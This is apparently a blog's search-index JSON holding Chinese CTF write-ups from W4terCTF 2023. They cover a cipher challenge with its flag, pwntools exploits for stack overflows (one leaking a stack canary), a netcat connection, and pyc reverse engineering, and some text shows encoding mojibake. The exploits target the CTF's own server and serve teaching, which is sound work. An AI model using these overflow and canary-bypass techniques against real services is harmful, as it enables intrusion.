key and a private key, to encrypt and decrypt data. It's commonly used in digital signatures and secure communication protocols. In conclusion, cryptography is a fascinating and challenging subject that's critical to CTF challenges. Whether you're new to CTF or an experienced CTFer, understanding the different encryption techniques is essential to succeed in these challenges. Keep exploring and have fun cracking those ciphers! Your flag is W4terCTF open brace unRAV31 underline Th3 underline sEcrE7 underline 8URIeD underline 1N underline 1reqU3NcY close brace. Best regards, Dr. 0p\nflagå³ä¸ºï¼š\næœ€åä¸€æ®µï¼š W4terCTF open brace unRAV31 underline Th3 underline sEcrE7 underline 8URIeD underline 1N underline 1reqU3NcY close brace\nç¿»è¯‘ä¸€ä¸‹ï¼š W4terCTFå¼€å¤§æ‹¬å·unRAV31ä¸‹åˆ’çº¿Th3ä¸‹åˆ’çº¿sEcrE7ä¸‹åˆ’çº¿8URIeDä¸‹åˆ’çº¿1Nä¸‹åˆ’çº¿1reqU3NcYç»“æŸå¤§æ‹¬å·ã€‚\nå¾—åˆ°ï¼š W4terCTF{unRAV31_Th3_sEcrE7_8URIeD_1N_1reqU3NcY}\nç½‘ç«™æ›´æ–°ï¼š https://www.boxentriq.com/code-breaking/cipher-identifier https://www.boxentriq.com/code-breaking/vigenere-cipher https://ctf.bugku.com/tools å¯ä»¥å…ˆç”¨ç¬¬ä¸€ä¸ªç½‘ç«™æŸ¥çœ‹æœ€æœ‰å¯èƒ½åˆ©ç”¨çš„åŠ å¯†æ–¹æ³•ï¼Œå†ç”¨ç¬¬äºŒä¸ªç½‘ç«™çˆ†ç ´å¯†é’¥ï¼Œç¬¬äºŒã€ä¸‰ä¸ªç½‘ç«™å¯ä»¥ç”¨æ¥è§£å¯†å…¨æ–‡\n","date":"July 5, 2023","permalink":"/posts/wp/2023_04_ctf/7_weird-letter_write_up/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003eæ­¤æ–‡ç« ä»…é™æˆ˜é˜Ÿå†…éƒ¨æˆå‘˜é˜…è¯»\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„wpå§ï¼š\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://ta0lve.github.io/posts/wp/2023_06_ciscn/\"   target=\"_blank\"\u003e\n    2023 ciscn åˆèµ› Â· ta0lve\u003c/a\u003e\u003c/p\u003e","title":"misc-Weird Letter"},{"content":"","date":"July 5, 2023","permalink":"/series/my-first-series-of-ctf-wp/","section":"Series","summary":"","title":"My first series of CTF wp"},{"content":"æ­¤æ–‡ç« ä»…é™æˆ˜é˜Ÿå†…éƒ¨æˆå‘˜é˜…è¯»\nè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„wpå§ï¼š\n2023 ciscn åˆèµ› June 30, 2023\u0026middot;1691 å­—\u0026middot;4 åˆ†é’Ÿ WP CTF PWN reverse Crypto æ–‡ç« çš„éƒ¨åˆ†å†…å®¹è¢«å¯†ç ä¿æŠ¤ï¼š\n--- DON'T MODIFY THIS LINE ---\ræ ˆæº¢å‡ºåˆ©ç”¨çš„åŸºæœ¬æ­¥éª¤ # 1.å°†ç¨‹åºæ‹–å…¥IDAä¸­æŸ¥çœ‹åæ±‡ç¼–ä»£ç  # ï¼ˆä¹Ÿå¯ä»¥è‡ªå·±å…ˆåˆ©ç”¨é¢˜ç›®ç»™å‡ºçš„Cè¯­è¨€æºç ææ¸…æ¥šç¨‹åºé€»è¾‘åå†IDAåˆ†æï¼‰ å¯ä»¥çœ‹åˆ°å½“æˆ‘ä»¬çš„æ¸¸æˆwinæ—¶ä¼šè®©æˆ‘ä»¬è¾“å…¥åå­—ï¼Œä¸”så­—ç¬¦ä¸²çš„å¤§å°åªæœ‰16ï¼Œ 2.ç”¨é¼ æ ‡ç‚¹å‡»å˜é‡sï¼Œå¯ä»¥æŸ¥çœ‹vulnerableå‡½æ•°çš„æ ˆï¼Œ # å¯ä»¥çœ‹åˆ° s çš„å¤§å°ä¸º0x14 - 0x4 = 0x10 = 16 s ç¦»è¿”å›åœ°å€çš„è·ç¦»ä¸º0x14 - 0x0 = 20 ç”±32ä½æ ˆè°ƒç”¨çš„åŸç†å¯çŸ¥åœ¨è·³åˆ°è¿”å›åœ°å€å‰å‡½æ•°æ ˆè¿˜ä¼špop ebpå¯„å­˜å™¨ï¼Œ æ‰€ä»¥æˆ‘ä»¬çš„å¡«å……æ•°æ®æ®µå¤§å°ä¸º20+4=24ï¼Œ\n3.æœ€åæ‰¾åˆ°æˆ‘ä»¬è¦è·³è½¬åˆ°åé—¨å‡½æ•°ï¼ˆæˆ–è€…æ˜¯å¯ä»¥get shellï¼‰çš„åœ°å€ # å¯ä»¥çœ‹åˆ°åœ¨åœ°å€ä¸º 0x08049236 çš„æ±‡ç¼–ä»£ç æ˜¯successå‡½æ•°çš„å¼€å§‹ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„è·³è½¬çš„è¿”å›åœ°å€å¯ä»¥ä¸º 0x08049236 è¿™é‡Œçš„è¿”å›åœ°å€è¿˜å¯ä»¥å†™0x08049242ä¹‹å‰çš„å…¶ä»–åœ°å€ï¼š 0x08049237ã€0x08049239ã€0x0804923Aã€0x0804923D ä½†æ˜¯0x08049242åŠä¹‹åçš„åœ°å€å°±ä¸è¡Œäº†ï¼Œå› ä¸ºè½¬åˆ°è¿™äº›åœ°å€æ—¶å‡½æ•°çš„get shell æŒ‡ä»¤å°±ä¸èƒ½å®Œæ•´åœ°æ‰§è¡Œ å‘é€åœ°å€æ—¶æˆ‘ä»¬ç”¨p32()æ¥è¿›è¡Œ32ä½çš„å°ç«¯æ‰“åŒ…å­—èŠ‚å¹¶å‘é€\nexpå¦‚ä¸‹ï¼š # from pwn import* context(arch = \u0026#34;amd64\u0026#34;, os= \u0026#39;linux\u0026#39;) context.log_level = \u0026#39;debug\u0026#39; taolve = remote(\u0026#39;ctf.w4terdr0p.team\u0026#39;, 26539) #taolve = process(\u0026#39;./0\u0026#39;) \u0026#39;\u0026#39;\u0026#39; å¡«å……å­—ç¬¦ \u0026#39;\u0026#39;\u0026#39; offset = 24 #å¡«å……å­—ç¬¦çš„é•¿åº¦ ret_adrr=0x08049236 payload = b\u0026#39;a\u0026#39;*offset + p32(ret_adrr) #æˆ‘ä»¬è¦ä¿®æ”¹ä¸ºçš„è¿”å›åœ°å€ taolve.recvuntil(b\u0026#39;Please give me a position(0-8):\u0026#39;) taolve.sendline(b\u0026#39;1\u0026#39;) taolve.recvuntil(b\u0026#39;Please give me a position(0-8):\u0026#39;) taolve.sendline(b\u0026#39;1\u0026#39;) #å¡«ä¸€ä¸ªä¸åˆç†çš„æ•°å­—è®©ç”µè„‘å¸®æˆ‘ä»¬ä¸‹æ£‹ï¼ˆï¼‰ #å®é™…æ‰§è¡Œæ—¶å‘ç°æˆ‘ä»¬éšä¾¿å¡«ä¸€ä¸ªæ•°å­—å…¶å®æœ€åéƒ½æ˜¯æœ‰å¯èƒ½winçš„ï¼Œä¸€æ¬¡æ²¡winå°±ä¸¤æ¬¡ï¼ˆï¼‰ taolve.recvuntil(b\u0026#39;Please give me a position(0-8):\u0026#39;) taolve.sendline(b\u0026#39;1\u0026#39;) taolve.recvuntil(b\u0026#39;Tell me your name:\\n\u0026#39;) taolve.sendline(payload) taolve.interactive() #æœ€åè½¬åˆ°äº¤äº’æ¨¡å¼åè¿˜éœ€è¦ä½¿ç”¨linuxå‘½ä»¤è¡Œæ¥å¾—åˆ°flag #ls æŒ‡ä»¤æ¥æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æœ‰å“ªäº›æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ #cat flag æ¥æ‰“å° flag \u0026#39;\u0026#39;\u0026#39; å¦‚æœå‡ºç°ä¸‹é¢è¿™å¥è¯ï¼š [*] Got EOF while reading in interactive åˆ™è¯´æ˜å¯èƒ½ä¹‹å‰çš„æ ˆæº¢å‡ºå¡«å……å­—ç¬¦çš„é•¿åº¦è®¡ç®—é”™è¯¯ï¼Œ æˆ–è€…æ˜¯æˆ‘ä»¬æ‰€å¡«å†™çš„è¿”å›åœ°å€æœ‰é”™è¯¯ï¼Œ æ¯”å¦‚æœªå®Œæˆä¹‹å‰çš„å¿…è¦æ±‡ç¼–æŒ‡ä»¤å°±å¼ºè¡Œæ‰§è¡Œä¸€äº›æŒ‡ä»¤ \u0026#39;\u0026#39;\u0026#39; è¡¥å……ï¼špwnåŸºç¡€â€”â€”å¦‚ä½•å®šä½æº¢å‡ºç‚¹ä½ç½® # ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_ctf/2_tic-tac-toe-level-0_write_up/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003eæ­¤æ–‡ç« ä»…é™æˆ˜é˜Ÿå†…éƒ¨æˆå‘˜é˜…è¯»\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„wpå§ï¼š\u003c/p\u003e\n\n\u003csection class=\"space-y-10 w-full\"\u003e\n    \n    \n        \n            \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \u003ca class=\"flex flex-wrap article border border-neutral-200 dark:border-neutral-700 border-2 rounded-md backdrop-blur\" href=\"/posts/wp/2023_06_ciscn/\"\u003e\n    \n        \n        \u003cdiv class=\"w-full md:w-auto h-full thumbnail nozoom \" style=\"background-image:url(/posts/wp/2023_06_ciscn/featured.jpg);\"\u003e\u003c/div\u003e\n        \n      \u003cdiv class=\" p-4\"\u003e\n      \u003cdiv class=\"items-center text-xl font-semibold\"\u003e\n        \n        \u003cdiv class=\"font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral\"\n          href=\"/posts/wp/2023_06_ciscn/\"\u003e2023 ciscn åˆèµ›\u003c/div\u003e\n        \n        \n        \n      \u003c/div\u003e\n      \u003cdiv class=\"text-sm text-neutral-500 dark:text-neutral-400\"\u003e\n        \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\u003cdiv class=\"flex flex-row flex-wrap items-center\"\u003e\n  \n  \n  \u003ctime datetime=\"2023-06-30 00:00:00 \u0026#43;0000 UTC\"\u003eJune 30, 2023\u003c/time\u003e\u003cspan class=\"px-2 text-primary-500\"\u003e\u0026middot;\u003c/span\u003e\u003cspan\u003e1691 å­—\u003c/span\u003e\u003cspan class=\"px-2 text-primary-500\"\u003e\u0026middot;\u003c/span\u003e\u003cspan title=\"é¢„è®¡é˜…è¯»\"\u003e4 åˆ†é’Ÿ\u003c/span\u003e\n  \n\n  \n  \n\u003c/div\u003e\n\n\n\n\n\n\u003cdiv class=\"flex flex-row flex-wrap items-center\"\u003e\n  \n  \n  \n  \n  \n  \n  \u003cspan style=\"margin-top:0.5rem\" class=\"mr-2\" onclick=\"window.open(\u0026#34;/categories/wp/\u0026#34;,'_self');\"\u003e\n    \u003cspan class=\"flex\"\u003e\n  \u003cspan\n    class=\"rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400\"\n  \u003e\n    WP\n  \u003c/span\u003e\n\u003c/span\u003e\n\n  \u003c/span\u003e\n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \u003cspan style=\"margin-top:0.5rem\" class=\"mr-2\" onclick=\"window.open(\u0026#34;/tags/ctf/\u0026#34;,'_self');\"\u003e\n    \u003cspan class=\"flex\"\u003e\n  \u003cspan\n    class=\"rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400\"\n  \u003e\n    CTF\n  \u003c/span\u003e\n\u003c/span\u003e\n\n  \u003c/span\u003e\n  \n  \u003cspan style=\"margin-top:0.5rem\" class=\"mr-2\" onclick=\"window.open(\u0026#34;/tags/pwn/\u0026#34;,'_self');\"\u003e\n    \u003cspan class=\"flex\"\u003e\n  \u003cspan\n    class=\"rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400\"\n  \u003e\n    PWN\n  \u003c/span\u003e\n\u003c/span\u003e\n\n  \u003c/span\u003e\n  \n  \u003cspan style=\"margin-top:0.5rem\" class=\"mr-2\" onclick=\"window.open(\u0026#34;/tags/reverse/\u0026#34;,'_self');\"\u003e\n    \u003cspan class=\"flex\"\u003e\n  \u003cspan\n    class=\"rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400\"\n  \u003e\n    reverse\n  \u003c/span\u003e\n\u003c/span\u003e\n\n  \u003c/span\u003e\n  \n  \u003cspan style=\"margin-top:0.5rem\" class=\"mr-2\" onclick=\"window.open(\u0026#34;/tags/crypto/\u0026#34;,'_self');\"\u003e\n    \u003cspan class=\"flex\"\u003e\n  \u003cspan\n    class=\"rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400\"\n  \u003e\n    Crypto\n  \u003c/span\u003e\n\u003c/span\u003e\n\n  \u003c/span\u003e\n  \n  \n  \n  \n\u003c/div\u003e\n\n\n\n      \u003c/div\u003e\n      \n    \u003c/div\u003e\n  \u003c/a\u003e\n        \n    \n\u003c/section\u003e\n\u003chr\u003e","title":"PWN-Level 0 Tic-Tac-Toe "},{"content":"æ­¤æ–‡ç« ä»…é™æˆ˜é˜Ÿå†…éƒ¨æˆå‘˜é˜…è¯»\nè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„wpå§ï¼š\n2023 ciscn åˆèµ› Â· ta0lve\næ–‡ç« çš„éƒ¨åˆ†å†…å®¹è¢«å¯†ç ä¿æŠ¤ï¼š\n--- DON'T MODIFY THIS LINE ---\rç”±canaryçš„ç»“æ„æˆ‘ä»¬å¯ä»¥å¾—çŸ¥å½“æˆ‘ä»¬è¾“å…¥çš„å¡«å……å­—ç¬¦è¦†ç›–æ‰canaryçš„æœ€åä¸€ä½/00å­—ç¬¦æ—¶å°±èƒ½åˆ©ç”¨è¾“å‡ºå‡½æ•°å°†canaryçš„å€¼æ‰“å°å‡ºæ¥ï¼ŒçŸ¥é“canaryçš„å€¼åæˆ‘ä»¬å°±èƒ½ç»•è¿‡Canaryä¿æŠ¤è¿›è¡Œæ ˆæº¢å‡ºå•¦ exp:\n# encoding: utf-8 from pwn import* #context(arch = \u0026#34;amd64\u0026#34;, os= \u0026#39;linux\u0026#39;) context.log_level = \u0026#39;debug\u0026#39; taolve = remote(\u0026#39;ctf.w4terdr0p.team\u0026#39;, 39302) #taolve = process(\u0026#39;./1\u0026#39;) \u0026#39;\u0026#39;\u0026#39; å¡«å……å­—ç¬¦ \u0026#39;\u0026#39;\u0026#39; offset = 40 ret_adrr = 0x4013DB taolve.recvuntil(b\u0026#39;How many tokens would you like to take?: \u0026#39;) taolve.send(b\u0026#39;a\u0026#39;*40+b\u0026#39;d\u0026#39;) taolve.recvuntil(b\u0026#39;ad\u0026#39;) canary = u64(b\u0026#39;\\x00\u0026#39; + taolve.recv(7)) print(hex(canary)) payload = b\u0026#39;a\u0026#39;*40 + p64(canary) + p64(0) + p64(ret_adrr) taolve.recvuntil(b\u0026#39;How many tokens would you like to take?: \u0026#39;) taolve.send(payload) taolve.interactive() ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_ctf/3_nimgame-level-1_write_up/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003eæ­¤æ–‡ç« ä»…é™æˆ˜é˜Ÿå†…éƒ¨æˆå‘˜é˜…è¯»\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„wpå§ï¼š\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://ta0lve.github.io/posts/wp/2023_06_ciscn/\"   target=\"_blank\"\u003e\n    2023 ciscn åˆèµ› Â· ta0lve\u003c/a\u003e\u003c/p\u003e","title":"PWN-Level 1 Nimgame"},{"content":"æ­¤æ–‡ç« ä»…é™æˆ˜é˜Ÿå†…éƒ¨æˆå‘˜é˜…è¯»\nè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„wpå§ï¼š\n2023 ciscn åˆèµ› June 30, 2023\u0026middot;1691 å­—\u0026middot;4 åˆ†é’Ÿ WP CTF PWN reverse Crypto æ–‡ç« çš„éƒ¨åˆ†å†…å®¹è¢«å¯†ç ä¿æŠ¤ï¼š\n--- DON'T MODIFY THIS LINE ---\r1.ç»™å‡ºçš„å®ä¾‹å…¥å£ä¸º host:portï¼Œåˆ™å¯ä»¥ä½¿ç”¨ nc host port æ¥è¿æ¥åˆ°å¯¹åº”çš„å®ä¾‹ éœ€è¦åœ¨linuxè™šæ‹Ÿæœº / macos ä¸­å®‰è£…nc ï¼Œåœ¨Windowsä¸Šä¹Ÿå¯ä»¥å®‰è£…nc ï¼ˆä¸è¿‡è¦è®¾ç½®å¥½ç¯å¢ƒå˜é‡ï¼Œå¯èƒ½ç³»ç»Ÿè¿˜ä¼šæŠ¥æ¯’ï¼‰ 2.ç”¨pythonçš„pwntoolsåº“æ¥è¿œç¨‹è¿æ¥å®ä¾‹å…¥å£\nfrom pwn import* context.log_level = \u0026#39;debug\u0026#39; taolve = remote(\u0026#34;ctf.w4terdr0p.team\u0026#34;, 45423) taolve.interactive() ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_ctf/1_what-is-netcat_write_up/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003eæ­¤æ–‡ç« ä»…é™æˆ˜é˜Ÿå†…éƒ¨æˆå‘˜é˜…è¯»\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„wpå§ï¼š\u003c/p\u003e\n\u003chr\u003e\n\n\u003csection class=\"space-y-10 w-full\"\u003e\n    \n    \n        \n            \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \u003ca class=\"flex flex-wrap article border border-neutral-200 dark:border-neutral-700 border-2 rounded-md backdrop-blur\" href=\"/posts/wp/2023_06_ciscn/\"\u003e\n    \n        \n        \u003cdiv class=\"w-full md:w-auto h-full thumbnail nozoom \" style=\"background-image:url(/posts/wp/2023_06_ciscn/featured.jpg);\"\u003e\u003c/div\u003e\n        \n      \u003cdiv class=\" p-4\"\u003e\n      \u003cdiv class=\"items-center text-xl font-semibold\"\u003e\n        \n        \u003cdiv class=\"font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral\"\n          href=\"/posts/wp/2023_06_ciscn/\"\u003e2023 ciscn åˆèµ›\u003c/div\u003e\n        \n        \n        \n      \u003c/div\u003e\n      \u003cdiv class=\"text-sm text-neutral-500 dark:text-neutral-400\"\u003e\n        \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\u003cdiv class=\"flex flex-row flex-wrap items-center\"\u003e\n  \n  \n  \u003ctime datetime=\"2023-06-30 00:00:00 \u0026#43;0000 UTC\"\u003eJune 30, 2023\u003c/time\u003e\u003cspan class=\"px-2 text-primary-500\"\u003e\u0026middot;\u003c/span\u003e\u003cspan\u003e1691 å­—\u003c/span\u003e\u003cspan class=\"px-2 text-primary-500\"\u003e\u0026middot;\u003c/span\u003e\u003cspan title=\"é¢„è®¡é˜…è¯»\"\u003e4 åˆ†é’Ÿ\u003c/span\u003e\n  \n\n  \n  \n\u003c/div\u003e\n\n\n\n\n\n\u003cdiv class=\"flex flex-row flex-wrap items-center\"\u003e\n  \n  \n  \n  \n  \n  \n  \u003cspan style=\"margin-top:0.5rem\" class=\"mr-2\" onclick=\"window.open(\u0026#34;/categories/wp/\u0026#34;,'_self');\"\u003e\n    \u003cspan class=\"flex\"\u003e\n  \u003cspan\n    class=\"rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400\"\n  \u003e\n    WP\n  \u003c/span\u003e\n\u003c/span\u003e\n\n  \u003c/span\u003e\n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \u003cspan style=\"margin-top:0.5rem\" class=\"mr-2\" onclick=\"window.open(\u0026#34;/tags/ctf/\u0026#34;,'_self');\"\u003e\n    \u003cspan class=\"flex\"\u003e\n  \u003cspan\n    class=\"rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400\"\n  \u003e\n    CTF\n  \u003c/span\u003e\n\u003c/span\u003e\n\n  \u003c/span\u003e\n  \n  \u003cspan style=\"margin-top:0.5rem\" class=\"mr-2\" onclick=\"window.open(\u0026#34;/tags/pwn/\u0026#34;,'_self');\"\u003e\n    \u003cspan class=\"flex\"\u003e\n  \u003cspan\n    class=\"rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400\"\n  \u003e\n    PWN\n  \u003c/span\u003e\n\u003c/span\u003e\n\n  \u003c/span\u003e\n  \n  \u003cspan style=\"margin-top:0.5rem\" class=\"mr-2\" onclick=\"window.open(\u0026#34;/tags/reverse/\u0026#34;,'_self');\"\u003e\n    \u003cspan class=\"flex\"\u003e\n  \u003cspan\n    class=\"rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400\"\n  \u003e\n    reverse\n  \u003c/span\u003e\n\u003c/span\u003e\n\n  \u003c/span\u003e\n  \n  \u003cspan style=\"margin-top:0.5rem\" class=\"mr-2\" onclick=\"window.open(\u0026#34;/tags/crypto/\u0026#34;,'_self');\"\u003e\n    \u003cspan class=\"flex\"\u003e\n  \u003cspan\n    class=\"rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400\"\n  \u003e\n    Crypto\n  \u003c/span\u003e\n\u003c/span\u003e\n\n  \u003c/span\u003e\n  \n  \n  \n  \n\u003c/div\u003e\n\n\n\n      \u003c/div\u003e\n      \n    \u003c/div\u003e\n  \u003c/a\u003e\n        \n    \n\u003c/section\u003e","title":"PWN-What is NetCat"},{"content":"","date":"July 5, 2023","permalink":"/tags/pwntool/","section":"Tags","summary":"","title":"pwntool"},{"content":"","date":"July 5, 2023","permalink":"/tags/pyc%E9%80%86%E5%90%91/","section":"Tags","summary":"","title":"pycé€†å‘"},{"content":"","date":"July 5, 2023","permalink":"/tags/reverse/","section":"Tags","summary":"","title":"reverse"},{"content":"æ­¤æ–‡ç« ä»…é™æˆ˜é˜Ÿå†…éƒ¨æˆå‘˜é˜…è¯»\nè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„wpå§ï¼š\n2023 ciscn åˆèµ› Â· ta0lve\næ–‡ç« çš„éƒ¨åˆ†å†…å®¹è¢«å¯†ç ä¿æŠ¤ï¼š\n--- DON'T MODIFY THIS LINE ---\rç›´æ¥å°†ç¨‹åºæ‹–å…¥IDAï¼Œshift+F12æŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œå³å¯çœ‹åˆ° flag ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_ctf/4_lazy-puts_write_up/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003eæ­¤æ–‡ç« ä»…é™æˆ˜é˜Ÿå†…éƒ¨æˆå‘˜é˜…è¯»\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„wpå§ï¼š\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://ta0lve.github.io/posts/wp/2023_06_ciscn/\"   target=\"_blank\"\u003e\n    2023 ciscn åˆèµ› Â· ta0lve\u003c/a\u003e\u003c/p\u003e","title":"reverse-Lazy Puts"},{"content":"æ­¤æ–‡ç« ä»…é™æˆ˜é˜Ÿå†…éƒ¨æˆå‘˜é˜…è¯»\nè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„wpå§ï¼š\n2023 ciscn åˆèµ› Â· ta0lve\næ–‡ç« çš„éƒ¨åˆ†å†…å®¹è¢«å¯†ç ä¿æŠ¤ï¼š\n--- DON'T MODIFY THIS LINE ---\rä¸‹è½½é¢˜ç›®é™„ä»¶åå‘ç°æ˜¯pycç¨‹åºï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆå°†pycç¨‹åºç”¨åœ¨çº¿ç½‘ç«™åç¼–è¯‘ä¸ºpythonä»£ç ï¼Œ pycæ–‡ä»¶åç¼–è¯‘åœ¨çº¿ç½‘ç«™ï¼š https://www.lddgo.net/string/pyc-compile-decompile åç¼–è¯‘åçš„ä»£ç ï¼š\n# uncompyle6 version 3.9.0 # Python bytecode version base 3.8.0 (3413) # Decompiled from: Python 3.6.12 (default, Feb 9 2021, 09:19:15) # [GCC 8.3.0] # Embedded file name: code.py # Compiled at: 2023-04-07 02:35:04 # Size of source mod 2**32: 2203 bytes import random nums = [ 1978258991135969430907740146613972524912040387261480714498605437001413714048012005658525477720873, 1414825718139831310004497635022196603261545889510259032286492681850346322299057448961219349615261, 1471197358920577704193422061749330372697192144784994772676793648983411513291005358932035022769990, 1095683197289929480686106401204396721653343660344305230304481285071676149806630337393361064473668, 921996790539554852662428059590451844400982285998027884584784172033455291195472563692294712472587, 768317485525512263520758851945293018259735364080330793974615632236110541795950958118326437487430, 544753920998122166512884082722895849761507576602028192924568306511924098132295226512319060641414, 87332110670036340709881571180530351791609485922184989048968644870753368056574249836210523509408, 1814118338382323693695027271435064617570300757148890716598838416084005431401276422453072948468217, 173167855524690381585242463414043296161603028899449630118125665233261307593525601052121277962903, 1328135371287398682018843879095667300066820442500694217856944376268862978878503400394942612696705, 4117570442808647688572679335481780771481111770146336113621471687653134742713621695560054296991, 1082796078933455613148302349648071297360971195093615794573975199793058617865979195384327642949519, 173826967948894750523527810600302472460382287952334480452515236484202394368569860647033480131050, 1926148526062731853158569840732303453811005817255836633583274407431574365300550129320730364526148, 576041746074522799631445170591885928961808907043509779947155037770053968111847260719001641989712, 298331994482251759036663482326665150166062610449547071972614876214926600675927398653925319016398, 1052527421677696645993193213526505700609834956685120728698363944650278933100105702857853287655234] if __name__ == \u0026#39;__main__\u0026#39;: flag = input(\u0026#39;Input your flag: \u0026#39;).strip().encode() num = int.from_bytes(flag, \u0026#39;big\u0026#39;) print(num) #flag1 = int(flag.decode()) flag1 = num.to_bytes( 128,\u0026#39;big\u0026#39;,signed = True) print(flag1) random.seed(num) for i in random.choices(nums, k=5): num ^= i else: if num == 3777974786954196899113426690262802545626191500785179338842593781943714596052295548581660967940571319476154736949371450126516159039: print(\u0026#39;Correct!\u0026#39;) else: print(\u0026#39;Wrong!\u0026#39;) ç›´æ¥éå†æ‰€æœ‰çš„æƒ…å†µï¼Œè·‘ä¸€éä»£ç ï¼Œå†ç”¨æ­£åˆ™è¡¨è¾¾å¼æœç´¢ç¬¦åˆæ¡ä»¶çš„flag\nnums = [ 1978258991135969430907740146613972524912040387261480714498605437001413714048012005658525477720873, 1414825718139831310004497635022196603261545889510259032286492681850346322299057448961219349615261, 1471197358920577704193422061749330372697192144784994772676793648983411513291005358932035022769990, 1095683197289929480686106401204396721653343660344305230304481285071676149806630337393361064473668, 921996790539554852662428059590451844400982285998027884584784172033455291195472563692294712472587, 768317485525512263520758851945293018259735364080330793974615632236110541795950958118326437487430, 544753920998122166512884082722895849761507576602028192924568306511924098132295226512319060641414, 87332110670036340709881571180530351791609485922184989048968644870753368056574249836210523509408, 1814118338382323693695027271435064617570300757148890716598838416084005431401276422453072948468217, 173167855524690381585242463414043296161603028899449630118125665233261307593525601052121277962903, 1328135371287398682018843879095667300066820442500694217856944376268862978878503400394942612696705, 4117570442808647688572679335481780771481111770146336113621471687653134742713621695560054296991, 1082796078933455613148302349648071297360971195093615794573975199793058617865979195384327642949519, 173826967948894750523527810600302472460382287952334480452515236484202394368569860647033480131050, 1926148526062731853158569840732303453811005817255836633583274407431574365300550129320730364526148, 576041746074522799631445170591885928961808907043509779947155037770053968111847260719001641989712, 298331994482251759036663482326665150166062610449547071972614876214926600675927398653925319016398, 1052527421677696645993193213526505700609834956685120728698363944650278933100105702857853287655234] if __name__ == \u0026#39;__main__\u0026#39;: #flag = input(\u0026#39;Input your flag: \u0026#39;).strip().encode() #num = int.from_bytes(flag, \u0026#39;big\u0026#39;) num = 3777974786954196899113426690262802545626191500785179338842593781943714596052295548581660967940571319476154736949371450126516159039; for a1 in range(18): for a2 in range (18): for a3 in range(18): for a4 in range(18): for a5 in range(18): num ^= nums[a1] num ^= nums[a2] num ^= nums[a3] num ^= nums[a4] num ^= nums[a5] flag1 = int.to_bytes(num, 54,\u0026#39;big\u0026#39;,signed = True) #if(flag1[0]==\u0026#39;W\u0026#39;): print(flag1) *å°æŠ€å·§ï¼šå¯ä»¥åœ¨Ubuntuè™šæ‹Ÿæœºä¸Šå…ˆè¾“å…¥å‘½ä»¤ï¼š\nscript -f log.txt #scriptå·¥å…·ï¼Œå¯ä»¥è®°å½•shellç»ˆç«¯çš„å†…å®¹åˆ°æ–‡ä»¶ä¸­ ç„¶åå†è¿è¡Œä»£ç ï¼Œå¾—åˆ°ä¸€ä¸ª245MBçš„txtæ–‡ä»¶ï¼ˆæœ‰äº¿ç‚¹ç‚¹å¤§ï¼‰ 